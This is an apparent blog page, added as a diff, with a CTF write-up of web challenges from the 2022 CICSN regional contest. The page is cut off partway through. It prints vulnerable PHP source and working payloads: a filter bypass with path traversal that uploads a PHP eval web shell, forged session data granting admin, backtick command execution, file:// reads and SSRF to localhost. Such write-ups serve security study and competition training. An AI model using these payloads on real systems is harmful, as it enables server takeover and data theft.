@@ -1,0 +1,844 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/maomao.png">
+  <link rel="icon" href="/img/maomao.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="k3">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2022-CICSN华东北-Web&#x2F;Re&#x2F;Misc-部分Wp 赛后跟几位大佬交流了一下，分享一下复现的一些思路  Web会聊天的机器人很容易发现image部分可以进行file协议文件读取，但是没找到flag，这时候看源码 1file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;api.php  123456789101112131415161718192021222324252627282">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022-CICSN华东北-Web&#x2F;Re&#x2F;Misc-部分Wp">
+<meta property="og:url" content="https://www.imfengyuan.info/2022/06/25/20220619CICSNHDB/index.html">
+<meta property="og:site_name" content="imK3">
+<meta property="og:description" content="2022-CICSN华东北-Web&#x2F;Re&#x2F;Misc-部分Wp 赛后跟几位大佬交流了一下，分享一下复现的一些思路  Web会聊天的机器人很容易发现image部分可以进行file协议文件读取，但是没找到flag，这时候看源码 1file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;api.php  123456789101112131415161718192021222324252627282">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image-20220624140808585.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_24-Hj9V-lr.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_hXC_9J9Soa.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_u4Iz1gbMGo.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_DJnLAAd2ba.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_K42EP6mmI-.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_qIg8L77pCi.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_P0fCDgsEty.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image-20220624142537662.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_bU6qJVKNOf.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_dgwIXuKV20.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_ZyUew6tSIn.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_0pLnOeMePJ.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_QZKMj3LCb7.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_icZKHEHr6t.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_bPdUMZbSzT.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_cIxXKJnS3a.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_SjgcV06qSZ.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_AhlYouG5Re.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image-20220624141543273.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_FB1Wjp8Vhf.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_kKxC1COteL.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_h0kxJxg4wG.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_cRzDDJ9dsW.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_QbOBANp1zP.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_bfyee4QYo0.png">
+<meta property="og:image" content="https://www.imfengyuan.info/2022/06/25/imgs/20220619CICSNHDB/image_LEbs_NHCKy.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_vI-A9ixbsy.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_lgM4sKVtmB.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image_MffanHtnNU.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image-20220624141801022.png">
+<meta property="og:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image-20220624141937846.png">
+<meta property="article:published_time" content="2022-06-25T11:19:23.000Z">
+<meta property="article:modified_time" content="2022-06-25T12:20:23.000Z">
+<meta property="article:author" content="imfengyuan">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.imfengyuan.info/imgs/20220619CICSNHDB/image-20220624140808585.png">
+  
+  
+  <title>2022-CICSN华东北-Web/Re/Misc-部分Wp - imK3</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.imfengyuan.info","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="imK3" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>K3&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/mao.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2022-CICSN华东北-Web/Re/Misc-部分Wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-25 11:19" pubdate>
+          2022年6月25日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          45 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2022-CICSN华东北-Web/Re/Misc-部分Wp</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年6月25日 中午
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="2022-CICSN华东北-Web-x2F-Re-x2F-Misc-部分Wp"><a href="#2022-CICSN华东北-Web-x2F-Re-x2F-Misc-部分Wp" class="headerlink" title="2022-CICSN华东北-Web&#x2F;Re&#x2F;Misc-部分Wp"></a>2022-CICSN华东北-Web&#x2F;Re&#x2F;Misc-部分Wp</h1><blockquote>
+<p>赛后跟几位大佬交流了一下，分享一下复现的一些思路</p>
+</blockquote>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="会聊天的机器人"><a href="#会聊天的机器人" class="headerlink" title="会聊天的机器人"></a>会聊天的机器人</h3><p>很容易发现image部分可以进行file协议文件读取，但是没找到flag，这时候看源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">///var/www/html/api.php</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">init</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$sesspath</span> = <span class="hljs-string">&quot;/tmp/session&quot;</span>;<br>    <span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-variable">$sesspath</span>);<br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;cname&#x27;</span>])<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;cname&#x27;</span>] = <span class="hljs-string">&#x27;ck&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_dir_exists</span>(<span class="hljs-string">&quot;/tmp/resource&quot;</span>))<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;/tmp/resource&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_dir_exists</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span>)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span>-&gt;<span class="hljs-title function_ invoke__">read</span>())<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getres</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-title function_ invoke__">log_write</span>(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;/tmp/resource/&quot;</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;cname&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_dir_exists</span>(<span class="hljs-variable">$path</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;请先上传词库文件。&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$ck</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$path</span>),<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ck</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$key</span>,<span class="hljs-variable">$input</span>) <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$input</span>,<span class="hljs-variable">$key</span>))&#123;<br>            <span class="hljs-variable">$type</span> = <span class="hljs-title function_ invoke__">key</span>(<span class="hljs-variable">$value</span>);<br>            <span class="hljs-variable">$v</span> = <span class="hljs-variable">$value</span>[<span class="hljs-variable">$type</span>];<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$type</span>)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;string&quot;</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$v</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image&quot;</span>:<br>                    <span class="hljs-variable">$b64img</span> = <span class="hljs-string">&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;</span>.<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$v</span>)) . <span class="hljs-string">&#x27;&quot;/&gt;&#x27;</span>;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$b64img</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;calc&quot;</span>:<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;is_admin&#x27;</span>])&#123;<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\(|\)|\&#x27;|\&quot;/im&quot;</span>,<span class="hljs-variable">$v</span>))&#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;包含非法字符&quot;</span>;<br>                        &#125;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v</span>;&quot;</span>);<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;admin才能使用这个功能&quot;</span>;<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;这个动作暂时还没能实现&quot;</span>;<br>            &#125;<br><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;没有匹配到词库消息&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadc</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uploadc&#x27;</span>];<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cname&#x27;</span>];<br>    <span class="hljs-variable">$resourcedir</span> = <span class="hljs-string">&quot;/tmp/resource/&quot;</span>;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_dir_exists</span>(<span class="hljs-variable">$resourcedir</span>))<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$resourcedir</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;&lt;&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;别这样！&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;.&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;别这样！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;cname&#x27;</span>] = <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$resourcedir</span>.<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传成功&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;上传失败&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log_write</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>)</span>&#123;<br>    <span class="hljs-variable">$logpath</span> = <span class="hljs-string">&quot;log.txt&quot;</span>;<br>    <span class="hljs-variable">$oper</span> = <span class="hljs-title function_ invoke__">session_id</span>();<br>    <span class="hljs-variable">$opername</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$oper</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt;= <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$oper</span>);<span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$opername</span> .= <span class="hljs-string">&quot;*&quot;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$logpath</span>,<span class="hljs-string">&quot;<span class="hljs-subst">$opername</span> : <span class="hljs-subst">$msg</span> \n&quot;</span>,FILE_APPEND);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;input&#x27;</span>]))<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">getres</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;input&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uploadc&#x27;</span>]))<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">uploadc</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;clear&#x27;</span>]))<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;log.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;log&#x27;</span>]))<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;log.txt&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<h4 id="思路1：函数uploadc，过滤绕过，目录穿越些shell"><a href="#思路1：函数uploadc，过滤绕过，目录穿越些shell" class="headerlink" title="思路1：函数uploadc，过滤绕过，目录穿越些shell"></a>思路1：函数uploadc，过滤绕过，目录穿越些shell</h4><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(strpos($data,<span class="hljs-string">&quot;&lt;&quot;</span>)  <span class="hljs-meta"># $data=<span class="hljs-string">&quot;&lt;?php xxxx&quot;</span></span><br><span class="hljs-keyword">if</span>(strpos($filename,<span class="hljs-string">&quot;.&quot;</span>) <span class="hljs-meta">#$filename=<span class="hljs-string">&quot;../xxx&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>这两个判断，很容易绕过，只要data和filename开头是对应的”&lt;”和”.”导致strpos返回值为0，即可绕过。</p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">uploadc=<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span>&amp;cname=../../../xxx.php<br></code></pre></td></tr></table></figure>
+
+<h4 id="思路2：目录穿越伪造session，使用calc功能"><a href="#思路2：目录穿越伪造session，使用calc功能" class="headerlink" title="思路2：目录穿越伪造session，使用calc功能"></a>思路2：目录穿越伪造session，使用calc功能</h4><p>伪造部分，查阅资料，或者直接file协议看看自己的session长什么样子</p>
+<p>exp</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">uploadc</span>=is_admin|s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;xx&quot;</span><span class="hljs-comment">;&amp;cname=../session/sess_xxxx</span><br></code></pre></td></tr></table></figure>
+
+<p>修改Cookie为PHPSESSID&#x3D;xxxx，上传词库规则，使用&#96;&#96;，进行绕过非法字符，执行命令即可</p>
+<p>exp</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&#123;<span class="hljs-string">&quot;calc&quot;</span>:<span class="hljs-string">&quot;`ls /`&quot;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><p>访问flag.php，发现需要本地访问之后，就可以写入flag.txt</p>
+<h4 id="思路1-getimagesize-SSRF"><a href="#思路1-getimagesize-SSRF" class="headerlink" title="思路1:getimagesize-SSRF"></a>思路1:getimagesize-SSRF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$img</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;img&quot;</span>]<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$img</span>))&#123;<br>	<span class="hljs-title function_ invoke__">checkimg</span>(<span class="hljs-variable">$img</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">checkimg</span>(<span class="hljs-variable">$img</span>)&#123;<br>   ...<br>	<span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$img</span>);<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p> 这里直接GET添加参数?img&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p>
+<h4 id="思路2-file-get-contents-SSRF"><a href="#思路2-file-get-contents-SSRF" class="headerlink" title="思路2:file_get_contents-SSRF"></a>思路2:file_get_contents-SSRF</h4><p>上传图片的时候，（在进行正则匹配前会进行file_get_contents，实现ssrf）修改内容为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-Type: image/gif<br><br>file://127.0.0.1/flag.php<br></code></pre></td></tr></table></figure>
+
